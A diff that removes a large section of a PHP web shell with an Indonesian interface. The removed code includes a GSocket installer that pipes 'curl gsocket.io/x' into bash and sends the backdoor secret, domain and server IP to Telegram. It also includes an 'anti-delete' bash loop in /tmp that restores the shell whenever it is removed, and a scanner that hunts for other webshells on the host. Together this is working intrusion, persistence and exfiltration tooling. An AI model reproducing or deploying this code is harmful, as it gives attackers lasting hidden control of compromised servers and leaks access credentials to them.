-        echo "<pre style='background: #000; padding: 10px; border-radius: 4px; font-size: 11px; color: #0f0; max-height: 300px; overflow-y: auto; white-space: pre-wrap;'>";
-        @ob_flush(); @flush();
-
-        $cmd = "curl -Lso- gsocket.io/x | bash 2>&1";
-        $output = '';
-
-        if (@function_exists('shell_exec')) {
-            $output = @shell_exec($cmd);
-        } elseif (@function_exists('exec')) {
-            @exec($cmd, $out_arr);
-            $output = implode("\n", $out_arr);
-        } elseif (@function_exists('passthru')) {
-            ob_start();
-            @passthru($cmd);
-            $output = ob_get_clean();
-        } else {
-            $output = "Error: Tidak ada fungsi eksekusi yang tersedia";
-        }
-
-        echo htmlspecialchars($output ?: 'Tidak ada output');
-        echo "</pre>";
-
-        // Cari gs-netcat command di output dan kirim ke Telegram
-        if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"/', $output, $matches)) {
-            $gs_secret = $matches[1];
-            $gs_command = 'gs-netcat -s "' . $gs_secret . '"';
-            $domain = $_SERVER['HTTP_HOST'] ?? 'Unknown';
-            $ip = $_SERVER['SERVER_ADDR'] ?? 'Unknown';
-
-            $tg_msg = "🔌 <b>GSOCKET INSTALLED</b>\n";
-            $tg_msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-            $tg_msg .= "🌐 <b>Domain:</b> <code>{$domain}</code>\n";
-            $tg_msg .= "📡 <b>IP:</b> <code>{$ip}</code>\n";
-            $tg_msg .= "🔑 <b>Secret:</b> <code>{$gs_secret}</code>\n";
-            $tg_msg .= "💻 <b>Command:</b>\n<code>{$gs_command}</code>\n";
-            $tg_msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-            $tg_msg .= "✅ GSocket berhasil diinstall!";
-            send_telegram_report($tg_msg);
-
-            echo "<p style='color: #00ff00; margin-top: 10px;'>✅ Instalasi selesai</p>";
-            echo "<p style='color: #4af;'>🔑 Secret: <code>{$gs_secret}</code></p>";
-        } else {
-            echo "<p style='color: #00ff00; margin-top: 10px;'>✅ Instalasi selesai</p>";
-        }
-        exit;
-    }
-
-    // Default: Show menu
-    echo "<p style='color: #aaa; margin-bottom: 15px;'>Install GSocket untuk membuat secure tunnel connection.</p>";
-    echo "<button onclick=\"openModalWithURL('?gsocket_install=1&ajax=1&action=install')\" style='padding: 12px 20px; background: #00aa00; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; width: 100%;'>";
-    echo "🚀 <b>Install GSocket</b>";
-    echo "</button>";
-
-    echo "</div>";
-    exit;
-}
-
-// ===== ANTI-DELETE STANDALONE MENU =====
-if (isset($_GET['antidelete_menu']) && isset($_GET['ajax'])) {
-    global $current_script_path;
-    $shell_path = $current_script_path;
-    $antidelete_pid_file = '/tmp/.antidelete_' . md5($shell_path) . '.pid';
-    $antidelete_log_file = '/tmp/.antidelete_' . md5($shell_path) . '.log';
-
-    // Action: Start
-    if (isset($_GET['action']) && $_GET['action'] === 'start') {
-        // Cek apakah sudah berjalan
-        if (@file_exists($antidelete_pid_file)) {
-            $pid = @trim(@file_get_contents($antidelete_pid_file));
-            if ($pid && @file_exists("/proc/$pid")) {
-                // Sudah berjalan dengan benar
-                echo "<h3>🔒 Anti-Delete</h3>";
-                echo "<p style='color: #ffcc00;'>⚠️ Anti-Delete sudah berjalan (PID: $pid)</p>";
-                echo "<button onclick=\"openModalWithURL('?antidelete_menu=1&ajax=1')\" style='margin-top: 15px; padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Kembali</button>";
-                exit;
-            } else {
-                // PID file ada tapi proses mati - bersihkan file lama
-                @unlink($antidelete_pid_file);
-                @unlink('/tmp/.antidelete_' . md5($shell_path) . '.sh');
-                @unlink($antidelete_log_file);
-            }
-        }
-
-        $antidelete_script = '/tmp/.antidelete_' . md5($shell_path) . '.sh';
-        $script_lines = [
-            '#!/bin/bash',
-            'SHELL_PATH="' . $shell_path . '"',
-            'PID_FILE="' . $antidelete_pid_file . '"',
-            'LOG_FILE="' . $antidelete_log_file . '"',
-            'echo $$ > "$PID_FILE"',
-            'TIMESTAMP=$(TZ="Asia/Jakarta" date +"%Y-%m-%d %H:%M:%S")',
-            'echo "$TIMESTAMP: Anti-delete dimulai untuk $SHELL_PATH" >> "$LOG_FILE"',
-            'ORIGINAL_CONTENT=$(cat "$SHELL_PATH" 2>/dev/null)',
-            'while true; do',
-            '    TIMESTAMP=$(TZ="Asia/Jakarta" date +"%Y-%m-%d %H:%M:%S")',
-            '    if [ ! -f "$SHELL_PATH" ]; then',
-            '        echo "$TIMESTAMP: File dihapus, memulihkan..." >> "$LOG_FILE"',
-            '        echo "$ORIGINAL_CONTENT" > "$SHELL_PATH"',
-            '        chmod 0644 "$SHELL_PATH" 2>/dev/null',
-            '        echo "$TIMESTAMP: File berhasil dipulihkan" >> "$LOG_FILE"',
-            '    else',
-            '        CURRENT_CONTENT=$(cat "$SHELL_PATH" 2>/dev/null)',
-            '        if [ "$CURRENT_CONTENT" != "$ORIGINAL_CONTENT" ]; then',
-            '            echo "$TIMESTAMP: File dimodifikasi, memulihkan..." >> "$LOG_FILE"',
-            '            echo "$ORIGINAL_CONTENT" > "$SHELL_PATH"',
-            '            echo "$TIMESTAMP: File berhasil dipulihkan" >> "$LOG_FILE"',
-            '        fi',
-            '    fi',
-            '    sleep 5',
-            'done'
-        ];
-        $script_content = implode("\n", $script_lines) . "\n";
-        @file_put_contents($antidelete_script, $script_content);
-        @chmod($antidelete_script, 0755);
-
-        // Try multiple methods to run background process
-        $cmd = "nohup bash " . escapeshellarg($antidelete_script) . " > /dev/null 2>&1 &";
-
-        $started = false;
-        if (@function_exists('shell_exec')) {
-            @shell_exec($cmd);
-            $started = true;
-        } elseif (@function_exists('exec')) {
-            @exec($cmd);
-            $started = true;
-        } elseif (@function_exists('popen')) {
-            $handle = @popen($cmd, 'r');
-            if ($handle) { @pclose($handle); $started = true; }
-        } elseif (@function_exists('proc_open')) {
-            $proc = @proc_open($cmd, [], $pipes);
-            if ($proc) { @proc_close($proc); $started = true; }
-        } elseif (@function_exists('system')) {
-            @system($cmd . ' &');
-            $started = true;
-        } elseif (@function_exists('passthru')) {
-            @passthru($cmd);
-            $started = true;
-        }
-
-        // Wait and verify process started
-        sleep(3);
-
-        // Retry mechanism - cek beberapa kali dengan waktu lebih lama
-        $max_retries = 5;
-        $pid = null;
-        $process_running = false;
-
-        for ($retry = 0; $retry < $max_retries; $retry++) {
-            if (@file_exists($antidelete_pid_file)) {
-                $pid = @trim(@file_get_contents($antidelete_pid_file));
-                if ($pid) {
-                    // Coba beberapa metode untuk cek proses berjalan
-                    $is_running = false;
-
-                    // Metode 1: Cek /proc/$pid
-                    if (@file_exists("/proc/$pid")) {
-                        $is_running = true;
-                    }
-                    // Metode 2: Cek dengan ps command
-                    elseif (@function_exists('shell_exec')) {
-                        $ps_check = @shell_exec("ps -p $pid 2>/dev/null | grep -c $pid");
-                        if (trim($ps_check) >= 1) {
-                            $is_running = true;
-                        }
-                    }
-                    // Metode 3: Cek log file ada update (proses menulis log)
-                    elseif (@file_exists($antidelete_log_file)) {
-                        $log_time = @filemtime($antidelete_log_file);
-                        if ($log_time && (time() - $log_time) < 10) {
-                            $is_running = true;
-                        }
-                    }
-
-                    if ($is_running) {
-                        $process_running = true;
-                        break;
-                    }
-                }
-            }
-            // Jika gagal, tunggu dan coba lagi
-            if ($retry < $max_retries - 1) {
-                sleep(1);
-            }
-        }
-
-        echo "<h3>🔒 Anti-Delete</h3>";
-        if ($process_running) {
-            // Send Telegram notification
-            $domain = $_SERVER['HTTP_HOST'] ?? 'Unknown';
-            $shell_url = get_base_url() . ($_SERVER['REQUEST_URI'] ?? '/');
-            $tg_msg = "🟢 <b>ANTI-DELETE AKTIF</b>\n";
-            $tg_msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-            $tg_msg .= "🌐 <b>Domain:</b> <code>{$domain}</code>\n";
-            $tg_msg .= "🔗 <b>Shell:</b> <a href=\"{$shell_url}\">{$shell_url}</a>\n";
-            $tg_msg .= "🔒 <b>Status:</b> Terlindungi\n";
-            $tg_msg .= "⏰ <b>Waktu:</b> " . date('Y-m-d H:i:s') . "\n";
-            $tg_msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-            $tg_msg .= "✅ File akan otomatis restore jika dihapus/diubah";
-            send_telegram_report($tg_msg);
-
-            echo "<p style='color: #00ff00;'>✅ Anti-Delete berhasil diaktifkan!</p>";
-            echo "<p style='color: #888;'>PID: <code>$pid</code></p>";
-            echo "<p style='color: #aaa;'>Shell akan otomatis di-restore jika dihapus/diubah.</p>";
-            echo "<p style='color: #888;'>Halaman akan di-refresh...</p>";
-            echo "<script>setTimeout(function(){ window.location.reload(); }, 1500);</script>";
-        } else {
-            // Bersihkan file yang mungkin tertinggal
-            @unlink($antidelete_pid_file);
-            @unlink($antidelete_script);
-            @unlink($antidelete_log_file);
-
-            echo "<p style='color: #ff5555;'>❌ Gagal mengaktifkan Anti-Delete</p>";
-            echo "<p style='color: #888;'>Server mungkin tidak mendukung background process.</p>";
-            echo "<p style='color: #888;'>Pastikan fungsi exec/shell_exec tidak di-disable.</p>";
-        }
-        echo "<button onclick=\"openModalWithURL('?antidelete_menu=1&ajax=1')\" style='margin-top: 15px; padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Kembali</button>";
-        exit;
-    }
-
-    // Action: Stop
-    if (isset($_GET['action']) && $_GET['action'] === 'stop') {
-        if (@file_exists($antidelete_pid_file)) {
-            $pid = @trim(@file_get_contents($antidelete_pid_file));
-            if ($pid) {
-                @exec("kill $pid 2>/dev/null");
-                @exec("kill -9 $pid 2>/dev/null");
-            }
-            @unlink($antidelete_pid_file);
-            @unlink('/tmp/.antidelete_' . md5($shell_path) . '.sh');
-
-            // Send Telegram notification for stop
-            $domain = $_SERVER['HTTP_HOST'] ?? 'Unknown';
-            $shell_url = get_base_url() . ($_SERVER['REQUEST_URI'] ?? '/');
-            $tg_msg = "🔴 <b>ANTI-DELETE NONAKTIF</b>\n";
-            $tg_msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-            $tg_msg .= "🌐 <b>Domain:</b> <code>{$domain}</code>\n";
-            $tg_msg .= "🔗 <b>Shell:</b> <a href=\"{$shell_url}\">{$shell_url}</a>\n";
-            $tg_msg .= "🔓 <b>Status:</b> Tidak Terlindungi\n";
-            $tg_msg .= "⏰ <b>Waktu:</b> " . date('Y-m-d H:i:s') . "\n";
-            $tg_msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-            $tg_msg .= "⚠️ File tidak lagi dilindungi!";
-            send_telegram_report($tg_msg);
-        }
-        echo "<h3>🔒 Anti-Delete</h3>";
-        echo "<p style='color: #ffcc00;'>⏹️ Anti-Delete telah dinonaktifkan.</p>";
-        echo "<p style='color: #888;'>Halaman akan di-refresh...</p>";
-        echo "<script>setTimeout(function(){ window.location.reload(); }, 1500);</script>";
-        echo "<button onclick=\"openModalWithURL('?antidelete_menu=1&ajax=1')\" style='margin-top: 15px; padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Kembali</button>";
-        exit;
-    }
-
-    // Default: Show status menu
-    echo "<h3>🔒 Anti-Delete</h3>";
-    echo "<div style='padding: 15px; background: #111; border-radius: 8px;'>";
-
-    $is_running = false;
-    $pid = null;
-    if (@file_exists($antidelete_pid_file)) {
-        $pid = @trim(@file_get_contents($antidelete_pid_file));
-        if ($pid) {
-            // Cek proses berjalan dengan beberapa metode
-            $proc_running = false;
-            if (@file_exists("/proc/$pid")) {
-                $proc_running = true;
-            } elseif (@function_exists('shell_exec')) {
-                $ps = @shell_exec("ps -p $pid 2>/dev/null | grep -c $pid");
-                if (trim($ps) >= 1) $proc_running = true;
-            } elseif (@file_exists($antidelete_log_file) && (time() - @filemtime($antidelete_log_file)) < 30) {
-                $proc_running = true;
-            }
-
-            if ($proc_running) {
-                $is_running = true;
-            } else {
-                // PID file ada tapi proses mati - bersihkan otomatis
-                @unlink($antidelete_pid_file);
-                @unlink('/tmp/.antidelete_' . md5($shell_path) . '.sh');
-                $pid = null;
-            }
-        }
-    }
-
-    echo "<p style='color: #888; margin-bottom: 10px;'>File: <code style='color: #4af;'>" . htmlspecialchars(basename($shell_path)) . "</code></p>";
-
-    if ($is_running) {
-        echo "<p style='color: #00ff00; font-size: 16px; margin-bottom: 10px;'>● Status: <b>AKTIF</b> <span style='color: #0f0;'>(PID: $pid)</span></p>";
-        echo "<p style='color: #aaa; margin-bottom: 15px;'>Shell dilindungi. Auto-restore setiap 5 detik.</p>";
-
-        echo "<button onclick=\"openModalWithURL('?antidelete_menu=1&ajax=1&action=stop')\" style='padding: 12px 20px; background: #aa0000; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; width: 100%;'>";
-        echo "⏹️ <b>Stop Anti-Delete</b>";
-        echo "</button>";
-    } else {
-        echo "<p style='color: #888; font-size: 16px; margin-bottom: 15px;'>○ Status: <b>TIDAK AKTIF</b></p>";
-        echo "<p style='color: #aaa; margin-bottom: 15px;'>Aktifkan untuk melindungi shell dari penghapusan.</p>";
-        echo "<button onclick=\"openModalWithURL('?antidelete_menu=1&ajax=1&action=start')\" style='padding: 12px 20px; background: #00aa00; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; width: 100%;'>";
-        echo "🔒 <b>Aktifkan Anti-Delete</b>";
-        echo "</button>";
-    }
-
-    // Show log if exists
-    if (@file_exists($antidelete_log_file)) {
-        $log_content = @file_get_contents($antidelete_log_file);
-        if (!empty($log_content)) {
-            $log_lines = array_slice(array_filter(explode("\n", $log_content)), -10);
-            echo "<div style='margin-top: 20px;'>";
-            echo "<p style='color: #888; margin-bottom: 5px;'>Log terakhir:</p>";
-            echo "<pre style='background: #000; padding: 10px; border-radius: 4px; font-size: 11px; color: #0f0; max-height: 150px; overflow-y: auto;'>";
-            echo htmlspecialchars(implode("\n", $log_lines));
-            echo "</pre></div>";
-        }
-    }
-
-    echo "</div>";
-    exit;
-}
-
-if (isset($_GET['shell_finder']) && isset($_GET['ajax'])) {
-
-    // Cek apakah ini request untuk scan atau tampilkan form
-    if (!isset($_GET['do_scan'])) {
-        // Tampilkan form pilihan
-        echo "<h3>🔎 Shell Finder</h3>";
-        echo "<div style='padding: 15px; background: #111; border-radius: 8px;'>";
-        echo "<form id='shellFinderForm' style='display: flex; flex-direction: column; gap: 15px;'>";
-
-        echo "<div>";
-        echo "<label style='color: #00ff00; display: block; margin-bottom: 5px;'>📁 Scan Depth:</label>";
-        echo "<select id='scanDepth' style='padding: 8px; background: #222; color: #fff; border: 1px solid #444; border-radius: 4px; width: 100%;'>";
-        echo "<option value='0'>🔄 Unlimited (Scan Semua Folder)</option>";
-        echo "<option value='3'>3 Level</option>";
-        echo "<option value='5' selected>5 Level (Default)</option>";
-        echo "<option value='10'>10 Level</option>";
-        echo "<option value='20'>20 Level</option>";
-        echo "</select>";
-        echo "</div>";
-
-        // Detect public_html / document root
-        $default_scan_dir = '';
-
-        // 1. Coba DOCUMENT_ROOT dulu
-        if (!empty($_SERVER['DOCUMENT_ROOT']) && @is_dir($_SERVER['DOCUMENT_ROOT'])) {
-            $default_scan_dir = $_SERVER['DOCUMENT_ROOT'];
-        }
-
-        // 2. Jika kosong, cari public_html dari path saat ini
-        if (empty($default_scan_dir)) {
-            $current_path = @realpath(dirname($_SERVER['SCRIPT_FILENAME'] ?? __FILE__));
-
-            // Cari public_html, htdocs, www, atau html dalam path
-            $web_roots = ['public_html', 'htdocs', 'www', 'html', 'web', 'httpdocs'];
-            foreach ($web_roots as $web_root) {
-                if (($pos = strpos($current_path, '/' . $web_root)) !== false) {
-                    $default_scan_dir = substr($current_path, 0, $pos + strlen($web_root) + 1);
-                    break;
-                }
-            }
-        }
-
-        // 3. Jika masih kosong, naik ke parent tertinggi yang bisa diakses
-        if (empty($default_scan_dir)) {
-            $current_path = @realpath(dirname($_SERVER['SCRIPT_FILENAME'] ?? __FILE__));
-            $highest_readable = $current_path;
-
-            // Naik ke parent sampai tidak bisa baca lagi
-            while ($current_path !== '/' && $current_path !== '') {
-                $parent = dirname($current_path);
-                if ($parent === $current_path) break; // sudah di root
-
-                if (@is_readable($parent) && @is_dir($parent)) {
-                    $highest_readable = $parent;
-                    $current_path = $parent;
-                } else {
-                    break; // tidak bisa akses parent, berhenti
-                }
-            }
-
-            $default_scan_dir = $highest_readable;
-        }
-
-        // 4. Fallback terakhir
-        if (empty($default_scan_dir)) {
-            $default_scan_dir = getcwd();
-        }
-
-        echo "<div>";
-        echo "<label style='color: #00ff00; display: block; margin-bottom: 5px;'>📂 Start Directory:</label>";
-        echo "<input type='text' id='scanStartDir' value='" . htmlspecialchars($default_scan_dir) . "' style='padding: 8px; background: #222; color: #fff; border: 1px solid #444; border-radius: 4px; width: 100%; box-sizing: border-box;'>";
-        echo "<small style='color: #888; font-size: 11px;'>Default: Document Root / public_html</small>";
-        echo "</div>";
-
-        echo "<div>";
-        echo "<label style='color: #00ff00; display: block; margin-bottom: 5px;'>⚙️ Mode Scan:</label>";
-        echo "<select id='scanMode' style='padding: 8px; background: #222; color: #fff; border: 1px solid #444; border-radius: 4px; width: 100%;'>";
-        echo "<option value='normal'>📋 Normal (Tunggu sampai selesai)</option>";
-        echo "<option value='background'>🔄 Background (Dengan Progress)</option>";
-        echo "</select>";
-        echo "</div>";
-
-        echo "<button type='button' onclick='startShellScan()' style='padding: 10px 20px; background: #00aa00; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px;'>🚀 Mulai Scan</button>";
-        echo "</form>";
-        echo "</div>";
-
-        echo "<script>
-        var scanIntervalId = null;
-
-        function startShellScan() {
-            var depth = document.getElementById('scanDepth').value;
-            var startDir = encodeURIComponent(document.getElementById('scanStartDir').value);
-            var mode = document.getElementById('scanMode').value;
-
-            if (mode === 'background') {
-                startBackgroundScan(depth, startDir);
-            } else {
-                var url = '?shell_finder=1&ajax=1&do_scan=1&depth=' + depth + '&start_dir=' + startDir;
-                document.getElementById('ajaxContent').innerHTML = '<p style=\"color: #ffcc00;\">⏳ Scanning... Mohon tunggu...</p>';
-                fetch(url)
-                    .then(r => r.text())
-                    .then(html => { document.getElementById('ajaxContent').innerHTML = html; });
-            }
-        }
-
-        function startBackgroundScan(depth, startDir) {
-            // Show progress UI
-            document.getElementById('ajaxContent').innerHTML = `
-                <h3>🔎 Shell Finder - Background Scan</h3>
-                <div style='padding: 15px; background: #111; border-radius: 8px;'>
-                    <div id='scanProgress'>
-                        <p style='color: #ffcc00;'>⏳ Memulai scan...</p>
-                    </div>
-                    <div style='margin: 15px 0;'>
-                        <div style='background: #333; border-radius: 4px; height: 20px; overflow: hidden;'>
-                            <div id='progressBar' style='background: linear-gradient(90deg, #00ff00, #00aa00); height: 100%; width: 0%; transition: width 0.3s;'></div>
-                        </div>
-                        <p id='progressText' style='color: #888; font-size: 12px; margin-top: 5px;'>Mempersiapkan...</p>
-                    </div>
-                    <div id='scanStats' style='background: #1a1a1a; padding: 10px; border-radius: 4px; border-left: 3px solid #00ff00;'>
-                        <b style='color: #00ff00;'>📊 Progress:</b><br>
-                        <span id='statDirs'>Folder: 0</span><br>
-                        <span id='statFiles'>File PHP: 0</span><br>
-                        <span id='statFound'>Ditemukan: 0</span>
-                    </div>
-                    <button id='cancelScanBtn' onclick='cancelScan()' style='margin-top: 15px; padding: 8px 16px; background: #aa0000; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>❌ Batalkan</button>
-                </div>
-            `;
-
-            // Start the scan
-            fetch('?shell_finder_bg_start=1&depth=' + depth + '&start_dir=' + startDir)
-                .then(r => r.json())
-                .then(data => {
-                    if (data.scan_id) {
-                        // Start processing
-                        fetch('?shell_finder_bg_process=1&scan_id=' + data.scan_id);
-                        // Start polling for progress
-                        pollScanProgress(data.scan_id);
-                    }
-                });
-        }
-
-        function pollScanProgress(scanId) {
-            scanIntervalId = setInterval(function() {
-                fetch('?shell_finder_bg_status=1&scan_id=' + scanId)
-                    .then(r => r.json())
-                    .then(data => {
-                        if (data.error) {
-                            clearInterval(scanIntervalId);
-                            return;
-                        }
-
-                        // Update stats
-                        document.getElementById('statDirs').textContent = 'Folder: ' + (data.scanned_dirs || 0);
-                        document.getElementById('statFiles').textContent = 'File PHP: ' + (data.scanned_files || 0);
-                        document.getElementById('statFound').textContent = 'Ditemukan: ' + (data.found_count || 0);
-
-                        if (data.current_path) {
-                            var shortPath = data.current_path.length > 50 ? '...' + data.current_path.slice(-47) : data.current_path;
-                            document.getElementById('progressText').textContent = 'Scanning: ' + shortPath;
-                        }
-
-                        // Animate progress bar (estimate based on dirs scanned)
-                        var progress = Math.min(95, (data.scanned_dirs || 0) / 10);
-                        document.getElementById('progressBar').style.width = progress + '%';
-
-                        if (data.completed) {
-                            clearInterval(scanIntervalId);
-                            document.getElementById('progressBar').style.width = '100%';
-                            showScanResults(data);
-                        }
-                    })
-                    .catch(err => {
-                        console.error('Poll error:', err);
-                    });
-            }, 500);
-        }
-
-        function cancelScan() {
-            if (scanIntervalId) {
-                clearInterval(scanIntervalId);
-            }
-            openModalWithURL('?shell_finder=1&ajax=1');
-        }
-
-        function showScanResults(data) {
-            var html = '<h3>🔎 Shell Finder Results</h3>';
-            html += '<p>Scanning <code>' + (data.start_dir || '') + '</code></p>';
-            html += '<p>Depth: ' + (data.depth == 0 ? '<span style=\"color: #ff6600;\">UNLIMITED</span>' : data.depth + ' levels') + '</p>';
-
-            html += '<div style=\"background: #1a1a1a; padding: 10px; border-radius: 4px; margin: 10px 0; border-left: 3px solid #00ff00;\">';
-            html += '<b style=\"color: #00ff00;\">📊 Statistik Scan:</b><br>';
-            html += '• Folder discan: <b>' + data.scanned_dirs + '</b><br>';
-            html += '• File PHP discan: <b>' + data.scanned_files + '</b><br>';
-            html += '• Waktu scan: <b>' + data.duration + 's</b>';
-            html += '</div>';
-
-            if (data.found_shells && data.found_shells.length > 0) {
-                var webShells = data.found_shells.filter(s => s.url.startsWith('http'));
-                html += '<p style=\"color: #ff4444;\">⚠️ Ditemukan <b>' + data.found_shells.length + '</b> file mencurigakan, <b>' + webShells.length + '</b> dapat dikonversi ke URL web:</p>';
-
-                html += '<div style=\"max-height: 300px; overflow-y: scroll; background: #000; padding: 10px; border: 1px solid #00ff00;\">';
-                html += '<p style=\"color:#00ff7f;\"><b>URL Web Shell:</b></p>';
-                html += '<textarea style=\"width:100%; height:80px; background:#111; color:#fff; border:1px solid #00ff00;\">';
-                webShells.forEach(s => { html += s.url + '\\n'; });
-                html += '</textarea>';
-
-                html += '<p style=\"margin-top:15px; color:#ffcc00;\"><b>Detail:</b></p>';
-                html += '<table style=\"width: 100%; color: white; border-collapse: collapse; font-size: 11px;\">';
-                html += '<tr><th style=\"text-align: left;\">Path</th><th style=\"text-align: left;\">Keyword</th></tr>';
-                data.found_shells.forEach(s => {
-                    html += '<tr><td style=\"border-top: 1px dashed #333;\"><code>' + s.path + '</code></td><td style=\"border-top: 1px dashed #333; color: #ffcc00;\">' + s.match + '</td></tr>';
-                });
-                html += '</table></div>';
-            } else {
-                html += '<p style=\"color: #00ff7f;\">✅ Tidak ada file shell mencurigakan yang ditemukan.</p>';
-            }
-
-            html += '<button onclick=\"openModalWithURL(\\'?shell_finder=1&ajax=1\\')\" style=\"margin-top: 15px; padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;\">🔄 Scan Ulang</button>';
-
-            document.getElementById('ajaxContent').innerHTML = html;
-        }
-        </script>";
-        exit;
-    }
-
-    // Lakukan scan (mode normal/synchronous)
-    $suspicious_keywords = ['eval(', 'file_get_contents(', 'curl_exec(', 'base64_decode(', 'system(', 'shell_exec(', 'passthru(', 'assert(', 'include(', 'require(', 'fopen(', 'readfile(', 'exec(', 'proc_open(', 'popen(', 'create_function(', 'unserialize(', 'call_user_func(', 'file_put_contents(', 'unlink(', 'rmdir(', 'symlink(', '$_POST', '$_GET', '$_REQUEST', '$_COOKIE', '$_FILES'];
-    $found_shells = [];
-    $scanned_dirs_count = 0;
-    $scanned_files_count = 0;
-
-    // Ambil depth dari parameter (0 = unlimited)
-    $max_depth = isset($_GET['depth']) ? intval($_GET['depth']) : 5;
-    $document_root = @realpath($_SERVER['DOCUMENT_ROOT'] ?? '');
-    $base_url = get_base_url();
-
-    // Ambil start directory dari parameter
-    $start_dir = isset($_GET['start_dir']) ? $_GET['start_dir'] : ($_SERVER['DOCUMENT_ROOT'] ?? @getcwd());
-    $start_dir = @realpath($start_dir) ?: $start_dir;
-
-    $start_time = microtime(true);
-
-    if (@is_dir($start_dir) && @is_readable($start_dir)) {
-      $depth_text = ($max_depth == 0) ? "<span style='color: #ff6600;'>UNLIMITED</span>" : "{$max_depth} levels";
-
-      echo "<h3>🔎 Shell Finder Results</h3>";
-      echo "<p>Scanning <code>" . htmlspecialchars($start_dir) . "</code></p>";
-      echo "<p>Depth: {$depth_text}</p>";
-      echo "<p style='color: #0088ff;'>* Filter Self-Scan Aktif: Webshell utama diabaikan dari hasil.</p>";
-
-      scan_dir_for_shells(@rtrim($start_dir, DIRECTORY_SEPARATOR));
-
-      $end_time = microtime(true);
-      $scan_duration = round($end_time - $start_time, 2);
-
-      // Statistik scan
-      echo "<div style='background: #1a1a1a; padding: 10px; border-radius: 4px; margin: 10px 0; border-left: 3px solid #00ff00;'>";
-      echo "<b style='color: #00ff00;'>📊 Statistik Scan:</b><br>";
-      echo "• Folder discan: <b>{$scanned_dirs_count}</b><br>";
-      echo "• File PHP discan: <b>{$scanned_files_count}</b><br>";
-      echo "• Waktu scan: <b>{$scan_duration}s</b>";
-      echo "</div>";
-
-      if (count($found_shells) > 0) {
-          $web_url_shells = @array_filter($found_shells, function($shell_data) {
-              return @strpos($shell_data['url'], 'http') === 0 || @strpos($shell_data['url'], 'https') === 0;
-          });
-          $web_count = count($web_url_shells);
-          $shells_count = count($found_shells);
-          echo "<p style='color: #ff4444;'>⚠️ Ditemukan <b>" . $shells_count . "</b> file mencurigakan, <b>{$web_count}</b> dapat dikonversi ke URL web:</p>";
-          echo "<div style='max-height: 400px; overflow-y: scroll; background: #000; padding: 10px; border: 1px solid #00ff00ff;'>";
-
-          echo "<p style='color:#00ff7f;'><b>URL Web Shell yang Ditemukan (Untuk Browser):</b></p>";
-          echo "<textarea style='width:100%; height:100px; background:#111; color:#fff; border:1px solid #00ff00ff;'>";
-          foreach ($web_url_shells as $shell) {
-             echo htmlspecialchars($shell['url']) . "\n";
-          }
-          echo "</textarea>";
-
-          echo "<p style='margin-top:15px; color:#ffcc00;'><b>Detail Path Lokal + Keyword Match:</b></p>";
-          echo "<table style='width: 100%; color: white; border-collapse: collapse; font-size: 11px;'>";
-          echo "<tr><th style='text-align: left;'>Path (Lokal)</th><th style='text-align: left;'>Keyword Match</th></tr>";
-
-          foreach ($found_shells as $shell) {
-              $path_display = @strpos($shell['url'], 'LOCAL_PATH:') === 0 ? @str_replace('LOCAL_PATH: ', '', $shell['url']) : htmlspecialchars($shell['path']);
-              echo "<tr><td style='border-top: 1px dashed #333;'><code>" . $path_display . "</code></td><td style='border-top: 1px dashed #333; color: #ffcc00;'>{$shell['match']}</td></tr>";
-          }
-          echo "</table>";
-          echo "</div>";
-
-      } else {
-          echo "<p style='color: #00ff7f;'>✅ Tidak ada file shell mencurigakan yang ditemukan.</p>";
-      }
-
-      // Tombol scan ulang
-      echo "<button onclick=\"openModalWithURL('?shell_finder=1&ajax=1')\" style='margin-top: 15px; padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>🔄 Scan Ulang</button>";
-
-    } else {
-      echo "<h3>🔎 Shell Finder Results</h3>";
-      echo "<p style='color: #ffcc00;'>⚠️ ERROR: Tidak dapat membaca direktori. Path: " . htmlspecialchars($start_dir) . "</p>";
-    }
-
-    exit;
-}
-
-if (isset($_GET['defense_shell']) && isset($_GET['ajax'])) {
-
-    global $spread_link_file, $current_script_path;
-
-    $link_file_path = $spread_link_file;
-    $antidelete_pid_file = '/tmp/.antidelete_' . md5($current_script_path) . '.pid';
-
-    // ===== MODE: ANTI-DELETE =====
-    if (isset($_GET['antidelete'])) {
-        $action = $_GET['antidelete'];
-        $shell_path = $current_script_path;
-        $shell_url = get_base_url() . ($_SERVER['SCRIPT_NAME'] ?? '');
-
-        if ($action === 'start') {
-            // Check if already running
-            if (@file_exists($antidelete_pid_file)) {
-                $pid = @trim(@file_get_contents($antidelete_pid_file));
-                if ($pid && @file_exists("/proc/$pid")) {
-                    echo "<h3>🛡️ Anti-Delete</h3>";
-                    echo "<p style='color: #ffcc00;'>⚠️ Anti-Delete sudah berjalan (PID: $pid)</p>";
-                    echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1')\" style='margin-top: 15px; padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Kembali</button>";
-                    exit;
-                }
-            }
-
-            // Create anti-delete script inline
-            $antidelete_script = '/tmp/.antidelete_' . md5($shell_path) . '.sh';
-            $script_content = '#!/bin/bash
-SHELL_PATH="' . $shell_path . '"
-SHELL_URL="' . $shell_url . '"
-PID_FILE="' . $antidelete_pid_file . '"
-LOG_FILE="/tmp/.antidelete_' . md5($shell_path) . '.log"
-
-echo $$ > "$PID_FILE"
-TIMESTAMP=$(TZ="Asia/Jakarta" date +"%Y-%m-%d %H:%M:%S")
-echo "$TIMESTAMP: Anti-delete dimulai untuk $SHELL_PATH" >> "$LOG_FILE"
-
-# Save original content
-ORIGINAL_CONTENT=$(cat "$SHELL_PATH" 2>/dev/null)
-
-while true; do
